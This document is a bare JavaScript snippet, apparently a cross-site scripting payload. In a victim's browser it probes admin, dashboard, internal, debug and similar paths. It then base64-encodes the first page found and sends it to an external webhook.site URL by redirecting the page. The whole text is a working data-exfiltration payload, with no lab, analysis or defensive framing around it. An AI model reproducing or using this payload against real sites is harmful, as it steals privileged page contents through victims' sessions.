(async()=>{
let p=["/admin","/dashboard","/security","/internal","/debug","/reports"];
for(let x of p){
 try{
  let r=await fetch(x);
  let t=await r.text();
  if(r.status!=404){
   location="https://webhook.site/aef63664-4b2b-4a25-a695-c21c1fdd7a89?d="+btoa(x+":"+t);
   break;
  }
 }catch(e){}
}
})();